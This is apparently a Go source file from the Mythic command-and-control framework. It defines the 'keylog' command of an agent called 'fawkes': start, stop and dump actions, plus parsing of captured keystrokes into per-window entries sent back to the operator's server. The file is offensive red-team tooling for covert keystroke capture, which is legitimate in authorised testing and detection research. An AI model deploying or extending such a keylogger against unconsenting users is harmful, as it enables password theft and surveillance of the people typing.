package agentfunctions

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

// windowSectionRegex matches "[HH:MM:SS] --- Window Title ---" lines
var windowSectionRegex = regexp.MustCompile(`\[(\d{2}:\d{2}:\d{2})\] --- (.+?) ---`)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "keylog",
		Description:         "Start, stop, or dump a low-level keyboard logger with window context (T1056.001)",
		HelpString:          "keylog -action <start|stop|dump>",
		Version:             1,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1056.001"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"start", "stop", "dump"},
				Description:      "start: begin capturing keystrokes, stop: stop and return captured data, dump: return captured data without stopping",
				DefaultValue:     "start",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
					},
				},
			},
		},
		AssociatedBrowserScript: nil,
		TaskFunctionOPSECPre:    nil,
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := fmt.Sprintf("%s", action)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "API Call", "Keystroke capture (SetWindowsHookEx or /dev/input)")
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}

			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}

			// Only process stop/dump responses that contain captured keystrokes
			if !strings.Contains(responseText, "--- Captured Keystrokes ---") {
				return response
			}

			// Extract the keystroke data after the marker
			parts := strings.SplitN(responseText, "--- Captured Keystrokes ---", 2)
			if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
				return response
			}
			keystrokeData := parts[1]

			// Parse window sections: [HH:MM:SS] --- Window Title ---
			sections := windowSectionRegex.FindAllStringIndex(keystrokeData, -1)
			titles := windowSectionRegex.FindAllStringSubmatch(keystrokeData, -1)

			// Get user from callback info for keylog attribution
			user := processResponse.TaskData.Callback.User

			if len(sections) == 0 {
				// No window context — send as single entry
				keystrokes := strings.TrimSpace(keystrokeData)
				if keystrokes != "" {
					sendKeylog(processResponse.TaskData.Task.ID, user, "(unknown)", keystrokes)
				}
				return response
			}

			// Send each window section as a separate keylog entry
			for i, match := range sections {
				windowTitle := titles[i][2]
				var keystrokes string
				if i+1 < len(sections) {
					keystrokes = keystrokeData[match[1]:sections[i+1][0]]
				} else {
					keystrokes = keystrokeData[match[1]:]
				}
				keystrokes = strings.TrimSpace(keystrokes)
				if keystrokes != "" {
					sendKeylog(processResponse.TaskData.Task.ID, user, windowTitle, keystrokes)
				}
			}

			return response
		},
	})
}

func sendKeylog(taskID int, user, windowTitle, keystrokes string) {
	_, err := mythicrpc.SendMythicRPCKeylogCreate(mythicrpc.MythicRPCKeylogCreateMessage{
		TaskID: taskID,
		Keylogs: []mythicrpc.MythicRPCKeylogCreateProcessData{
			{
				WindowTitle: windowTitle,
				User:        user,
				Keystrokes:  keystrokes,
			},
		},
	})
	if err != nil {
		logging.LogError(err, "Failed to send keylog to Mythic", "window", windowTitle)
	}
}
